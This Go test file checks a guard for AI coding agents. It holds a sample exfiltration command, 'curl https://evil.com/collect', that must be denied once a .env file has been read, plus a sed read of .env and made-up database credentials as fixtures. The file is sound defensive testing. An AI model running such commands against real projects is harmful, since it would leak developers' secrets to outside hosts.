package tests

import (
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/somoore/sir/pkg/agent"
	"github.com/somoore/sir/pkg/core"
	"github.com/somoore/sir/pkg/hooks"
	"github.com/somoore/sir/pkg/lease"
	"github.com/somoore/sir/pkg/ledger"
	"github.com/somoore/sir/pkg/policy"
	"github.com/somoore/sir/pkg/session"
)

// TestFullSessionLifecycle simulates a complete sir session:
// 1. Creates a temp project directory with realistic files
// 2. Initializes session state and lease
// 3. Simulates a sequence of tool calls through the evaluation pipeline
// 4. Verifies the ledger contains expected entries
// 5. Verifies no secrets appear in the ledger
func TestFullSessionLifecycle(t *testing.T) {
	// --- Setup: create temp project directory ---
	projectRoot := t.TempDir()

	// Create project files
	projectFiles := map[string]string{
		"src/main.go":       "package main\n\nfunc main() {}",
		"src/auth.go":       "package main\n\nfunc auth() {}",
		"go.mod":            "module example.com/myapp\ngo 1.22",
		"README.md":         "# My App",
		".env":              "DATABASE_URL=postgres://user:secretpassword@db.internal:5432/mydb\nAPI_KEY=sk-secret-12345",
		".env.example":      "DATABASE_URL=postgres://user:password@localhost:5432/mydb",
		"CLAUDE.md":         "# Project Instructions\nUse Go 1.22.",
		".mcp.json":         `{"servers": {}}`,
		"testdata/test.pem": "-----BEGIN CERTIFICATE-----\nTEST CERT\n-----END CERTIFICATE-----",
		"package-lock.json": `{"lockfileVersion": 3}`,
	}

	// Create .claude/hooks directory structure
	projectFiles[".claude/hooks/hooks.json"] = `{"hooks": [{"event": "PreToolUse", "command": "sir guard evaluate"}]}`
	projectFiles[".claude/settings.json"] = `{"permissions": {"allow": []}}`

	for path, content := range projectFiles {
		fullPath := filepath.Join(projectRoot, path)
		if err := os.MkdirAll(filepath.Dir(fullPath), 0o755); err != nil {
			t.Fatalf("mkdir %s: %v", filepath.Dir(fullPath), err)
		}
		if err := os.WriteFile(fullPath, []byte(content), 0o644); err != nil {
			t.Fatalf("write %s: %v", path, err)
		}
	}

	// --- Initialize session state ---
	stateDir := session.StateDir(projectRoot)
	if err := os.MkdirAll(stateDir, 0o700); err != nil {
		t.Fatalf("create state dir: %v", err)
	}

	sess := session.NewState(projectRoot)
	l := lease.DefaultLease()

	// Store initial posture hashes (simulating session start)
	postureFiles := l.PostureFiles
	sess.PostureHashes = hashFiles(projectRoot, postureFiles)
	if err := sess.Save(); err != nil {
		t.Fatalf("save session: %v", err)
	}

	// --- Simulate tool call sequence ---
	type toolCall struct {
		toolName  string
		input     map[string]string
		expectDec string // expected decision
	}

	sequence := []toolCall{
		// 1. Normal file read - should allow
		{
			toolName:  "Read",
			input:     map[string]string{"file_path": "src/main.go"},
			expectDec: "allow",
		},
		// 2. Normal file write - should allow
		{
			toolName:  "Write",
			input:     map[string]string{"file_path": "src/auth.go"},
			expectDec: "allow",
		},
		// 3. Run tests - should allow
		{
			toolName:  "Bash",
			input:     map[string]string{"command": "go test ./..."},
			expectDec: "allow",
		},
		// 4. Read .env - should ask (sensitive)
		{
			toolName:  "Read",
			input:     map[string]string{"file_path": ".env"},
			expectDec: "ask",
		},
		// 5. Read .env.example - should allow (excluded)
		{
			toolName:  "Read",
			input:     map[string]string{"file_path": ".env.example"},
			expectDec: "allow",
		},
		// 6. Read testdata/test.pem - should allow (testdata excluded)
		{
			toolName:  "Read",
			input:     map[string]string{"file_path": "testdata/test.pem"},
			expectDec: "allow",
		},
		// 7. curl localhost - should allow
		{
			toolName:  "Bash",
			input:     map[string]string{"command": "curl localhost:3000/api/health"},
			expectDec: "allow",
		},
		// 8. git commit - should allow
		{
			toolName:  "Bash",
			input:     map[string]string{"command": "git commit -m \"feat: add auth\""},
			expectDec: "allow",
		},
	}

	// Process each tool call
	for i, tc := range sequence {
		verb, target := classifyForTest(tc.toolName, tc.input, l)
		isSensitive := false
		isPosture := false

		if tc.toolName == "Read" {
			isSensitive = isSensitivePathForTest(tc.input["file_path"], l)
		}
		if tc.toolName == "Write" || tc.toolName == "Edit" {
			isPosture = isPostureFileForTest(tc.input["file_path"], l)
		}

		req := &core.Request{
			Intent: core.Intent{
				Verb:        verb,
				Target:      target,
				IsSensitive: isSensitive,
				IsPosture:   isPosture,
			},
			Session: core.SessionInfo{
				SecretSession: sess.SecretSession,
				DenyAll:       sess.DenyAll,
			},
		}

		resp, err := core.Evaluate(req)
		if err != nil {
			t.Fatalf("step %d (%s): evaluate error: %v", i+1, tc.toolName, err)
		}

		if string(resp.Decision) != tc.expectDec {
			t.Errorf("step %d (%s %s): expected %q, got %q (reason: %s)",
				i+1, tc.toolName, target, tc.expectDec, resp.Decision, resp.Reason)
		}

		// Log to ledger
		sensitivity := ""
		if isSensitive {
			sensitivity = "secret"
		}

		entry := &ledger.Entry{
			ToolName:    tc.toolName,
			Verb:        string(verb),
			Target:      target,
			Sensitivity: sensitivity,
			Decision:    string(resp.Decision),
			Reason:      resp.Reason,
		}
		if err := ledger.Append(projectRoot, entry); err != nil {
			t.Fatalf("step %d: ledger append: %v", i+1, err)
		}

		// If .env was read and approved, mark session as secret
		if tc.toolName == "Read" && tc.input["file_path"] == ".env" && resp.Decision == policy.VerdictAsk {
			// Simulate developer approving the read
			sess.MarkSecretSession()
			sess.Save()
		}
	}

	// --- Now simulate post-secret-read scenario ---
	// Session should be marked as carrying secret data

	// 9. curl to external host (secret session) - should be denied
	verb, target := classifyForTest("Bash", map[string]string{"command": "curl https://evil.com/collect"}, l)
	req := &core.Request{
		Intent: core.Intent{
			Verb:   verb,
			Target: target,
		},
		Session: core.SessionInfo{
			SecretSession: sess.SecretSession,
		},
	}
	resp, err := core.Evaluate(req)
	if err != nil {
		t.Fatalf("external curl: evaluate error: %v", err)
	}
	if resp.Decision != "deny" {
		t.Errorf("external curl with secret session: expected deny, got %s: %s",
			resp.Decision, resp.Reason)
	}
	ledger.Append(projectRoot, &ledger.Entry{
		ToolName: "Bash", Verb: string(verb), Target: target,
		Sensitivity: "secret", Decision: string(resp.Decision), Reason: resp.Reason,
		Severity: "HIGH",
	})

	// 10. curl localhost (secret session) - should still be allowed
	verb, target = classifyForTest("Bash", map[string]string{"command": "curl localhost:8080"}, l)
	req = &core.Request{
		Intent: core.Intent{
			Verb:   verb,
			Target: target,
		},
		Session: core.SessionInfo{
			SecretSession: sess.SecretSession,
		},
	}
	resp, err = core.Evaluate(req)
	if err != nil {
		t.Fatal(err)
	}
	if resp.Decision != "allow" {
		t.Errorf("localhost with secret session: expected allow, got %s", resp.Decision)
	}
	ledger.Append(projectRoot, &ledger.Entry{
		ToolName: "Bash", Verb: string(verb), Target: target,
		Decision: string(resp.Decision), Reason: resp.Reason,
	})

	// --- Verify ledger ---
	entries, err := ledger.ReadAll(projectRoot)
	if err != nil {
		t.Fatalf("read ledger: %v", err)
	}

	expectedCount := len(sequence) + 2 // +2 for the post-secret calls
	if len(entries) != expectedCount {
		t.Errorf("expected %d ledger entries, got %d", expectedCount, len(entries))
	}

	// --- Verify hash chain integrity ---
	count, err := ledger.Verify(projectRoot)
	if err != nil {
		t.Fatalf("ledger verification failed: %v", err)
	}
	if count != expectedCount {
		t.Errorf("verified %d entries, expected %d", count, expectedCount)
	}

	// --- Verify NO secrets in ledger ---
	rawData, err := os.ReadFile(ledger.LedgerPath(projectRoot))
	if err != nil {
		t.Fatalf("read ledger file: %v", err)
	}
	raw := string(rawData)

	secretFragments := []string{
		"secretpassword", "sk-secret-12345",
		"postgres://user:secretpassword",
	}
	for _, fragment := range secretFragments {
		if strings.Contains(raw, fragment) {
			t.Errorf("SECURITY: ledger contains secret fragment %q", fragment)
		}
	}

	// Verify that file paths ARE stored
	if !strings.Contains(raw, ".env") {
		t.Error("ledger should contain .env path")
	}
	if !strings.Contains(raw, "src/main.go") {
		t.Error("ledger should contain src/main.go path")
	}
}

func TestSupportManifestFileReadIFCWitnesses(t *testing.T) {
	l := lease.DefaultLease()
	cases := []struct {
		name  string
		id    agent.AgentID
		tool  string
		input map[string]interface{}
	}{
		{
			name: "claude-read",
			id:   agent.Claude,
			tool: "Read",
			input: map[string]interface{}{
				"file_path": ".env",
			},
		},
		{
			name: "gemini-read",
			id:   agent.Gemini,
			tool: "Read",
			input: map[string]interface{}{
				"file_path": ".env",
			},
		},
		{
			name: "codex-bash-sensitive-read",
			id:   agent.Codex,
			tool: "Bash",
			input: map[string]interface{}{
				"command": "sed -n '1,10p' .env",
			},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			manifest, ok := agent.SupportManifestForID(tc.id)
			if !ok {
				t.Fatalf("manifest missing for %s", tc.id)
			}
			supported := false
			for _, surface := range manifest.Surfaces {
				if surface.Key == agent.SurfaceFileReadIFC {
					supported = surface.Supported
					break
				}
			}
			if !supported {
				t.Fatalf("manifest for %s does not claim file-read IFC support", tc.id)
			}

			intent := hooks.MapToolToIntent(tc.tool, tc.input, l)
			if intent.Verb != "read_ref" {
				t.Fatalf("intent verb = %q, want %q", intent.Verb, "read_ref")
			}
			if !intent.IsSensitive {
				t.Fatal("intent IsSensitive = false, want true")
			}

			resp, err := core.Evaluate(&core.Request{
				Intent: core.Intent{
					Verb:        intent.Verb,
					Target:      intent.Target,
					IsSensitive: intent.IsSensitive,
				},
			})
			if err != nil {
				t.Fatalf("Evaluate: %v", err)
			}
			if resp.Decision != "ask" {
				t.Fatalf("decision = %q, want %q (reason: %s)", resp.Decision, "ask", resp.Reason)
			}
		})
	}
}

func TestPostureTamperDetectionIntegration(t *testing.T) {
	projectRoot := t.TempDir()

	// Create posture files
	postureContents := map[string]string{
		".claude/hooks/hooks.json": `{"hooks": [{"event": "PreToolUse", "command": "sir guard evaluate"}]}`,
		"CLAUDE.md":                "# Instructions",
	}
	for path, content := range postureContents {
		fullPath := filepath.Join(projectRoot, path)
		os.MkdirAll(filepath.Dir(fullPath), 0o755)
		os.WriteFile(fullPath, []byte(content), 0o644)
	}

	// Initialize session with posture hashes
	stateDir := session.StateDir(projectRoot)
	os.MkdirAll(stateDir, 0o700)

	sess := session.NewState(projectRoot)
	posture := []string{".claude/hooks/hooks.json", "CLAUDE.md"}
	sess.PostureHashes = hashFiles(projectRoot, posture)
	sess.Save()

	// Simulate a Bash command that tampers with hooks.json
	os.WriteFile(
		filepath.Join(projectRoot, ".claude/hooks/hooks.json"),
		[]byte(`{}`), // hooks disabled
		0o644,
	)

	// Post-evaluate: detect tamper
	currentHashes := hashFiles(projectRoot, posture)
	for file, currentHash := range currentHashes {
		storedHash, ok := sess.PostureHashes[file]
		if ok && storedHash != currentHash {
			// Posture tamper detected
			if file == ".claude/hooks/hooks.json" {
				sess.SetDenyAll("sir configuration was modified unexpectedly: " + file)
			}
		}
	}

	if !sess.DenyAll {
		t.Fatal("expected deny-all after hooks.json tamper")
	}

	// Verify that ALL subsequent tool calls are denied
	resp, err := core.Evaluate(&core.Request{
		Intent: core.Intent{
			Verb:   "read_ref",
			Target: "src/main.go",
		},
		Session: core.SessionInfo{
			DenyAll: sess.DenyAll,
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if resp.Decision != "deny" {
		t.Errorf("after posture tamper, expected deny for all calls, got %s", resp.Decision)
	}
}

func TestLedgerLocationOutsideWorkspace(t *testing.T) {
	projectRoot := t.TempDir()

	stateDir := session.StateDir(projectRoot)
	os.MkdirAll(stateDir, 0o700)

	// Append an entry
	entry := &ledger.Entry{
		ToolName: "Read",
		Verb:     "read_ref",
		Target:   "main.go",
		Decision: "allow",
		Reason:   "within lease boundary",
	}
	if err := ledger.Append(projectRoot, entry); err != nil {
		t.Fatal(err)
	}

	ledgerPath := ledger.LedgerPath(projectRoot)

	// Verify the ledger is NOT inside the project root
	if strings.HasPrefix(ledgerPath, projectRoot) {
		t.Errorf("ledger should be stored outside workspace, but path %q is inside %q",
			ledgerPath, projectRoot)
	}

	// Verify it's under ~/.sir/projects/
	homeDir, _ := os.UserHomeDir()
	expectedPrefix := filepath.Join(homeDir, ".sir", "projects")
	if !strings.HasPrefix(ledgerPath, expectedPrefix) {
		t.Errorf("ledger path %q should be under %q", ledgerPath, expectedPrefix)
	}
}

func TestSessionStatePersistence(t *testing.T) {
	projectRoot := t.TempDir()

	stateDir := session.StateDir(projectRoot)
	os.MkdirAll(stateDir, 0o700)

	// Create and save session
	sess := session.NewState(projectRoot)
	sess.MarkSecretSession()
	sess.PostureHashes = map[string]string{
		".claude/hooks/hooks.json": "abc123",
	}
	if err := sess.Save(); err != nil {
		t.Fatal(err)
	}

	// Reload session
	loaded, err := session.Load(projectRoot)
	if err != nil {
		t.Fatal(err)
	}

	if !loaded.SecretSession {
		t.Error("loaded session should have SecretSession=true")
	}
	if loaded.PostureHashes[".claude/hooks/hooks.json"] != "abc123" {
		t.Error("loaded session should preserve posture hashes")
	}
}

func TestInstallCommandSequenceIntegration(t *testing.T) {
	projectRoot := t.TempDir()

	stateDir := session.StateDir(projectRoot)
	os.MkdirAll(stateDir, 0o700)

	// Create sentinel files
	sentinels := map[string]string{
		".claude/hooks/hooks.json": `{"hooks": []}`,
		"CLAUDE.md":                "# Instructions",
		".env":                     "KEY=value",
	}
	for path, content := range sentinels {
		fullPath := filepath.Join(projectRoot, path)
		os.MkdirAll(filepath.Dir(fullPath), 0o755)
		os.WriteFile(fullPath, []byte(content), 0o644)
	}

	// Pre-install: hash sentinels
	sentinelList := []string{".claude/hooks/hooks.json", "CLAUDE.md", ".env"}
	preHashes := hashFiles(projectRoot, sentinelList)

	// Simulate npm install (PreToolUse would return ask for unlocked package)
	// ... install runs ...
	// PostToolUse: verify sentinels unchanged

	postHashes := hashFiles(projectRoot, sentinelList)
	for file, postHash := range postHashes {
		preHash := preHashes[file]
		if preHash != postHash {
			t.Errorf("sentinel %q changed during install (this would trigger alert)", file)
		}
	}
}

// --- Test helpers ---

// hashFiles computes SHA-256 hashes of files relative to root.
func hashFiles(root string, files []string) map[string]string {
	result := make(map[string]string)
	for _, f := range files {
		data, err := os.ReadFile(filepath.Join(root, f))
		if err != nil {
			continue
		}
		h := sha256.Sum256(data)
		result[f] = fmt.Sprintf("%x", h)
	}
	return result
}

// classifyForTest maps tool calls to verbs (simplified for integration tests).
func classifyForTest(toolName string, input map[string]string, l *lease.Lease) (policy.Verb, string) {
	switch toolName {
	case "Read":
		return policy.VerbReadRef, input["file_path"]
	case "Write", "Edit":
		return policy.VerbStageWrite, input["file_path"]
	case "Bash":
		cmd := input["command"]
		return classifyBashForTest(cmd, l)
	case "WebFetch":
		url := input["url"]
		host := extractHostForTest(url)
		class := classifyHostForTest(host, l)
		switch class {
		case "loopback":
			return policy.VerbNetLocal, url
		case "approved":
			return policy.VerbNetAllowlisted, url
		default:
			return policy.VerbNetExternal, url
		}
	default:
		if len(toolName) > 5 && toolName[:5] == "mcp__" {
			return policy.VerbMcpUnapproved, toolName
		}
		return policy.VerbExecuteDryRun, toolName
	}
}

func classifyBashForTest(cmd string, l *lease.Lease) (policy.Verb, string) {
	if strings.HasPrefix(cmd, "curl ") || strings.HasPrefix(cmd, "wget ") {
		dest := extractDestForTest(cmd)
		host := extractHostForTest(dest)
		class := classifyHostForTest(host, l)
		switch class {
		case "loopback":
			return policy.VerbNetLocal, dest
		case "approved":
			return policy.VerbNetAllowlisted, dest
		default:
			return policy.VerbNetExternal, dest
		}
	}
	if strings.HasPrefix(cmd, "git push ") {
		parts := strings.Fields(cmd)
		remote := "origin"
		if len(parts) >= 3 {
			remote = parts[2]
		}
		for _, r := range l.ApprovedRemotes {
			if r == remote {
				return policy.VerbPushOrigin, remote
			}
		}
		return policy.VerbPushRemote, remote
	}
	if strings.HasPrefix(cmd, "npx ") {
		return policy.VerbRunEphemeral, cmd
	}
	if strings.HasPrefix(cmd, "go test ") || strings.HasPrefix(cmd, "cargo test") ||
		strings.HasPrefix(cmd, "npm test") || strings.HasPrefix(cmd, "pytest") {
		return policy.VerbRunTests, cmd
	}
	if strings.HasPrefix(cmd, "git commit") {
		return policy.VerbCommit, cmd
	}
	return policy.VerbExecuteDryRun, cmd
}

func extractDestForTest(cmd string) string {
	fields := strings.Fields(cmd)
	for i, f := range fields {
		if i == 0 {
			continue
		}
		if strings.HasPrefix(f, "-") {
			continue
		}
		return f
	}
	return ""
}

func extractHostForTest(url string) string {
	host := url
	if idx := strings.Index(host, "://"); idx >= 0 {
		host = host[idx+3:]
	}
	if idx := strings.Index(host, "/"); idx >= 0 {
		host = host[:idx]
	}
	if idx := strings.Index(host, ":"); idx >= 0 {
		host = host[:idx]
	}
	return host
}

func classifyHostForTest(host string, l *lease.Lease) string {
	if host == "localhost" || host == "127.0.0.1" || host == "::1" {
		return "loopback"
	}
	for _, h := range l.ApprovedHosts {
		if h == host {
			return "approved"
		}
	}
	return "external"
}

func isSensitivePathForTest(path string, l *lease.Lease) bool {
	for _, excl := range l.SensitivePathExclusions {
		if matchGlobForTest(excl, path) {
			return false
		}
	}
	for _, pat := range l.SensitivePaths {
		if matchGlobForTest(pat, path) {
			return true
		}
	}
	return false
}

func isPostureFileForTest(path string, l *lease.Lease) bool {
	for _, pf := range l.PostureFiles {
		if pf == path {
			return true
		}
	}
	return false
}

func matchGlobForTest(pattern, name string) bool {
	if pattern == name {
		return true
	}
	if strings.HasSuffix(pattern, "/**") {
		prefix := pattern[:len(pattern)-3]
		if strings.HasPrefix(name, prefix+"/") {
			return true
		}
	}
	if strings.HasPrefix(pattern, "*.") {
		ext := pattern[1:]
		if strings.HasSuffix(name, ext) {
			return true
		}
	}
	if strings.HasSuffix(pattern, "/*") {
		dir := pattern[:len(pattern)-2]
		if strings.HasPrefix(name, dir+"/") {
			return true
		}
	}
	if idx := strings.Index(pattern, "/**/"); idx >= 0 {
		prefix := pattern[:idx]
		suffix := pattern[idx+4:]
		if strings.HasPrefix(name, prefix) {
			if strings.HasPrefix(suffix, "*") {
				ext := suffix[1:]
				if strings.HasSuffix(name, ext) {
					return true
				}
			}
		}
	}
	if strings.HasSuffix(pattern, ".*") {
		base := pattern[:len(pattern)-2]
		if strings.HasPrefix(name, base+".") {
			return true
		}
	}
	return false
}

// marshalJSON is a test helper to serialize structures for fixture comparison.
func marshalJSON(v interface{}) string {
	data, _ := json.MarshalIndent(v, "", "  ")
	return string(data)
}
